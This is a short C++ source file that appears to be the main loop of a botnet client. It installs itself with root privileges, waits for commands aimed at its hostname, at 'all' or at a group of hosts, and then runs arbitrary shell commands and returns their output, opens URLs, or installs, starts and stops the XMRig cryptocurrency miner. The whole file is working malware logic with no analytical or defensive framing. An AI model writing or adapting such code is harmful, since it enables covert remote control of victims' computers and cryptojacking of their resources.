#include "worker_utils.h"

int main()
{
    Worker_utils worker;

    // Installation
    if (!worker.isInstalled())
        worker.install("root");

    std::vector<std::string> msgs;

    while (true)
    {
        worker.receive(msgs);
        std::string hostname = exec("hostname");
        if (msgs[0] == hostname || msgs[0] == "all" || (msgs[0] == "114" && hostname[0] == 'S' && hostname[1] == 'M'))
        {
            if (msgs[1] == "cmd")
            {
                std::string answ = exec(msgs[2].c_str());
                worker.send(answ);
            }
            else if (msgs[1] == "open url")
            {
               worker.openUrl(msgs[2]); 
            }
            else if (msgs[1] == "set msg count")
            {
                worker.setReceiveMsgCnt(std::stoi(msgs[2]));
            }
            else if (msgs[1] == "inst xmrig")
            {
                worker.instXmrig();
            }
            else if (msgs[1] == "run xmrig")
            {
                worker.runXmrix();
            }
            else if (msgs[1] == "stop xmrig")
            {
                worker.stopXmrig();
            }
        }
    }

    return 0;
}